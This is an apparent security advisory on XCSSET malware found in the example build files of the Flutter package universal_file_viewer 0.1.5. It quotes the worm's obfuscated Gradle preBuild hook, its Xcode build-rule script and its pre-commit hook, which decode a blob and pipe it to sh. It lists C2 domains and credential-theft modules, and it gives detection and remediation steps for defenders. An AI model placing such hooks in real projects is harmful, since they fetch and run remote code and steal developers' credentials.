# Flutter universal_file_viewer pub.dev Compromise — XCSSET Worm Spreads via Infected Maintainer Machine (First pub.dev Malware)

**Date:** September 2026
**Ecosystem:** pub.dev / Dart / Flutter / macOS
**Severity:** High
**Type:** Worm / Maintainer Machine Compromise / Build Hook Injection
**Sources:**
- [Aikido — Compromised Flutter package on pub.dev contains XCSSET malware](https://www.aikido.dev/blog/compromised-flutter-package-on-pub-dev-contains-xcsset-malware)

---

## Summary

On September 8, 2026, Aikido Security detected the first known malware on pub.dev — the official package repository for Dart and Flutter. The package `universal_file_viewer` version 0.1.5 (a Flutter file preview widget for PDF, Word, Excel, video, Markdown, and plain text) was found to contain a variant of XCSSET, a macOS worm active since 2020 that injects malicious build hooks into Android Gradle projects, Xcode projects, and git repositories.

This was not a targeted supply chain attack. The maintainer's own development machine had been infected with XCSSET. When they published version 0.1.5 from that infected machine, the worm's modified build files in the `example/` directory came along for the ride. The Dart library code in `lib/` is entirely clean; the malicious content lives only in the example application's build configurations. A developer who adds `universal_file_viewer` as a dependency and builds their own app is not exposed — the risk is to someone who clones the repository and explicitly builds the example app locally. GitHub searches performed at disclosure time showed other maintainers actively pushing XCSSET-infected projects without realizing it.

XCSSET operates as a multi-stage, multi-module macOS worm: a build hook in the infected project contacts a C2 server and retrieves a series of in-memory modules for propagation (android_finder, git_finder, replicator_finder) and credential theft (browser passwords, Safari data, Firefox credentials, Telegram session data, clipboard, Notes/Reminders/Calendar data, and targeted home directory files). The worm survives reboots via a Dock persistence technique that replaces the Launchpad tile with a fake bundle.

---

## Compromised Artifacts

| Package | Malicious Version(s) | Registry | Weekly Downloads |
|---------|---------------------|----------|-----------------|
| `universal_file_viewer` | 0.1.5 | pub.dev | ~500 total |

---

## How It Worked

### Entry Point: Maintainer Machine Infection

XCSSET infected the maintainer's macOS development machine prior to publication. When the maintainer ran `dart pub publish` for version 0.1.5, the pub.dev tarball included the `example/` directory, which contained three infected build configurations injected independently by XCSSET's worm modules.

**Normal dependency consumers are not affected** — pub.dev packages used as dependencies do not execute the `example/` build files. Exposure requires cloning the GitHub repository and building the example application locally.

### Three Independent Build Hook Infections

**Android (android_finder module)**
The file `example/android/app/build.gradle.kts` contains a `preBuild` hook:
```groovy
tasks.all {
  if (name.contains("preBuild")) {
    doLast {
      ProcessBuilder("sh", "-c",
        "((p(){ `printf xAxd | tr -d A` -p -r; };echo 6563686f...0a | p | sh ) >/dev/null 2>&1 &)"
      ).start()
    }
  }
}
```
`printf xAxd | tr -d A` reconstructs the `xxd` binary at runtime to defeat string-based scanners. The hex blob decodes to a `curl` to `5yotmxcc54l9xda[.]ru/a` with campaign tag `p=android_kotlin`. Output is silently discarded.

**iOS (replicator_finder module)**
`example/ios/Runner.xcodeproj/project.pbxproj` contains a `PBXBuildRule` that fires when any `.md` file is processed during a build:
```
script = "cp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A3EA261}\"";
```
`A3EA261` is a build setting in the same file, base64-obfuscated via `printf bdase64 | tr -d d`, pointing to `qdgs232i-q[.]ru` with tag `p=xcode_rule`.

**macOS (replicator_finder module)**
`example/macos/Runner.xcodeproj/project.pbxproj` contains an identical `PBXBuildRule` but with hex obfuscation (`printf xxVd | tr -d V`), pointing to `ejntin6hkjt7gj2[.]ru` with tag `p=xcode_rule`.

### Infection Chain (4 Stages)

1. **Stage 1:** The build hook contacts the C2 (`/a`) and receives a script that re-requests with the OS and username.
2. **Stage 2:** The server returns a ciphered shell script that collects the hardware serial number and locale, downloads the main loader to `/tmp/h`, compiles an invisible app bundle around it, launches it, then deletes both within ten seconds.
3. **Stage 3:** The loader is a run-only compiled AppleScript that decrypts itself using AES-256-CBC with a day-keyed key, then runs the decrypted payload in memory.
4. **Stage 4:** The decrypted payload is the core orchestrator that dispatches all worm and theft modules.

### Propagation Modules

**android_finder:** Searches `~/` up to `maxdepth 6` for `build.gradle` and `build.gradle.kts` files. For each Android module found, it injects the obfuscated `preBuild` hook (cleaning up any prior injection first). Handles both Kotlin DSL and Groovy syntax. Any developer who builds one of those projects gets infected, and so does anyone who later clones and builds the repo.

**git_finder:** Finds every `.git` directory on the machine and writes a malicious `pre-commit` hook with a polymorphic payload (C2 domain, encoding scheme, and nesting depth randomized per infection):
```bash
#!/usr/bin/env bash
((n(){ base64 --decode | base64 --decode; };echo <blob> | n | sh ) >/dev/null 2>&1 &)
```
Every commit from the developer in any repository silently re-triggers the full chain. Existing hooks are patched via `sed` rather than replaced.

**replicator_finder:** The classic XCSSET vector (documented since 2020). Parses `project.pbxproj` files and injects a `Run Script` build phase. Any developer who opens and builds an infected Xcode project gets hit.

### Persistence

The `persist` module replaces the Launchpad tile in the Dock with a fake app bundle:
- Downloads `dockutil` from C2 (`/d/dockutil_arm64` or `/d/dockutil_amd64`), ad-hoc signs it
- Builds a fake bundle under `~/Library/Caches/vyf[.]lttzw[.]snjgwq/`
- Patches `Info.plist` to impersonate Launchpad (`CFBundleDisplayName = 'Launchpad'`, `CFBundleIdentifier = 'com.apple.launchpad.launcher'`, `LSUIElement = YES`)
- Uses `dockutil` to swap the real Launchpad tile for the fake bundle

Clicking Launchpad opens the real Launchpad (`open -b com.apple.launchpad.launcher`) while silently firing the malicious script. Survives reboots. Leaves no trace in standard persistence locations (`LaunchAgents`, `LaunchDaemons`, `cron`).

### Theft Modules (In-Memory, Fetched from C2)

All theft modules are fetched from `/s/<module>` and executed via `osascript -e "$(curl ...)"`. Nothing is written to disk. Stolen data is AES-256-CBC encrypted before being sent to `/u`.

- **browser_remote:** Strips Chrome's Safe Storage keychain entry, intercepts the regenerated encryption key, exfiltrates saved passwords, cookies, and session tokens.
- **safari_remote:** Drops a fake Safari bundle, exfiltrates Safari local data.
- **firefox_data:** Downloads `hbdm_arm64`/`hbdm_amd64`, produces `firefox_browser_data.zip` and uploads to `/u`.
- **tdesktop:** Kills Telegram, drops a trojanized replacement from C2, targets session data from both classic and sandboxed paths.
- **notes_app:** Waits for Notes, Reminders, or Calendar to open; exfiltrates their data.
- **clipboard:** `pbpaste` loop exfiltrating clipboard contents.
- **settings_app:** Fake System Settings bundle; uses `sudo -u` for privilege escalation via a downloaded `mac_bin_daemon_app`.
- **data_folders_finder:** Walks home directory, exfiltrates targeted files to `/u`.

---

## Timeline

| Date/Time (UTC) | Event |
|----------------|-------|
| Before Sep 8, 2026 | Maintainer's macOS machine infected by XCSSET worm |
| Sep 8, 2026 | `universal_file_viewer@0.1.5` published to pub.dev with infected `example/` files |
| Sep 8, 2026 | Aikido Security detects XCSSET in the package; first-ever pub.dev malware report published |
| Sep 8, 2026 (post-disclosure) | GitHub search confirms other maintainers actively pushing XCSSET-infected projects |

---

## Detection

```bash
# Check Android build file for obfuscated preBuild hook
grep -r "printf xAxd" example/
grep -r "xAxd" example/

# Check iOS/macOS Xcode project for A3EA261 build setting (XCSSET marker)
grep -r "A3EA261" example/

# Check for infected git pre-commit hooks in any repo
find ~ -maxdepth 8 -path '*/.git/hooks/pre-commit' -exec grep -l 'base64 --decode | base64 --decode\|xxd -p -r | xxd -p -r' {} \;

# Check for XCSSET Dock persistence
ls ~/Library/Caches/ | grep -E '[a-z]{3}\.[a-z]{5,}\.[a-z]{6,}'

# Check for fake Launchpad tile in Dock plist
defaults read com.apple.dock persistent-apps | grep -i launchpad

# Check C2 domain connections in network logs
grep -E '5yotmxcc54l9xda\.ru|qdgs232i-q\.ru|ejntin6hkjt7gj2\.ru' /var/log/system.log

# List all Xcode projects on machine and check for injected PBXBuildRule
find ~ -maxdepth 6 -name 'project.pbxproj' -exec grep -l 'A3EA261' {} \;
```

---

## Remediation

1. **Remove or downgrade the package:** Unlist `universal_file_viewer@0.1.5` from your `pubspec.yaml`. Do not build the `example/` directory from this version.
2. **Check your macOS machine for XCSSET infection:**
   - Inspect all `.git/hooks/pre-commit` files for double-base64 or double-xxd decode chains
   - Check all `project.pbxproj` files for `A3EA261` build setting references
   - Check all `build.gradle.kts` / `build.gradle` files for `printf xAxd` obfuscation
   - Look for unexpected bundles under `~/Library/Caches/` with random-looking names
3. **Verify Dock integrity:** Compare your Dock's Launchpad tile path against `/System/Applications/Launchpad.app` — if it points elsewhere, remove the fake bundle and run `killall Dock`.
4. **Rotate credentials:** Assume all browser passwords, cookies, Telegram sessions, SSH keys, and cloud credentials on an infected machine are compromised. Rotate everything.
5. **Check git repositories:** Run `git log --oneline -10` across repos and inspect recent commits for unexpected changes. Remove any injected `pre-commit` hooks.
6. **Scan with Aikido:** If using Aikido, filter the central feed on malware issues — this appears as a 100/100 critical finding. Trigger a manual rescan.

---

## Lessons Learned

- **Build artifacts travel with packages.** pub.dev (like npm, PyPI, crates.io) includes the full source tree in its published tarball. `example/` directories, test fixtures, and build scripts all ship to every downloader — even if never compiled by downstream consumers.
- **Developer machines are an underappreciated supply chain entry point.** XCSSET demonstrates that attackers can contaminate multiple ecosystems (pub.dev, GitHub, Android, iOS, macOS) by infecting a single developer's laptop. No registry credential theft required.
- **Worms use build systems as their replication mechanism.** Gradle `preBuild` hooks, Xcode build phases, and git `pre-commit` hooks are trusted by developers and largely invisible during normal development workflows. Any of them can silently trigger network calls.
- **This is the first confirmed malware on pub.dev.** Dart/Flutter's ecosystem has had comparatively less security scrutiny than npm or PyPI. Registry-level malware scanning for pub.dev is a gap worth addressing.
- **XCSSET is persistent.** First documented in 2020, XCSSET continues to evolve and infect new maintainers. The `replicator_finder`, `android_finder`, and `git_finder` modules are still active six years later.

---

## Related Incidents

- [XCSSET v40 — Xcode Project Poisoning (Apr 2026)](./2026-04-xcsset-v40-xcode-supply-chain.md)
